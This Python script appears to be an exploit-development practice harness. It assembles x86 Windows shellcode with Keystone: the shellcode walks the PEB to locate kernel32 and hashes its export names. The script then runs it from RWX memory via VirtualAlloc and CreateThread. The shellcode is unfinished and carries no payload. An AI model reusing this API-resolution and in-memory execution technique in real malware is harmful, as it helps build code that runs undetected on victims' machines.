#!/usr/bin/env python3

import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  # Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 0x200                ;"  #
    "   call  find_kernel32             ;"  #
    "   call  find_function             ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   mov   esi,fs:[ecx+30h]          ;"  # ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0Ch]             ;"  # ESI = PEB->Ldr
    "   mov   esi,[esi+1Ch]             ;"  # ESI = PEB->Ldr.InInitOrder

    " next_module:                      "  #
    "   mov   ebx, [esi+8h]             ;"  # EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+20h]            ;"  # EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  # ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  # (unicode) modulename[12] == 0x00?
    "   jne   next_module               ;"  # No: try next module.
    "   ret                             ;"  #

    " find_function:                     "  #
    "   pushad                          ;"  # Save all registers
    "   mov   eax, [ebx+0x3c]           ;"  # Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  # Export Table Directory RVA
    "   add   edi, ebx                  ;"  # Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  # NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  # AddressOfNames RVA
    "   add   eax, ebx                  ;"  # AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  # Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  # Jump to the end if ECX is 0
    "   dec   ecx                       ;"  # Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  # Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  # Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  # Set ESI to the VMA of the current symbol name
    
    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_finished:            "  #
    "   popad                           ;"  # Restore registers
    "   ret                             ;"  #
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

try:
    encoding, count = ks.asm(CODE)
except keystone.KsError as e:
    print(e)
    print(type(e))
    print("Faulty Line: " + str(e.get_asm_count()))
    exit(0)

print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))